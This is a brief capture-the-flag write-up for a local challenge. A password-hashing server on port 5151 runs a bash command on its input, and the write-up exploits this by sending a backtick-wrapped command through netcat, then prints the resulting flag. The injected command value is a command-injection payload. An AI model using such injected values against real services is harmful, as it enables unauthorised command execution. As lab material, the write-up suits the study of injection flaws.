HINT:
the hash function looks very pawnable

ANSWER:
When looking at the code we can see that there is a server running on port 5151 of localhost and that server is waiting for a password.
It's useless to reverse the hash instead we notice that the hash function runs a bash comamnd with the given pass, let's abuse that:
nc localhost 5151
`getflag > /tmp/flag`
we get the /tmp/flag file and get:
g1qKMiRpXf53AWhDaU7FEkczr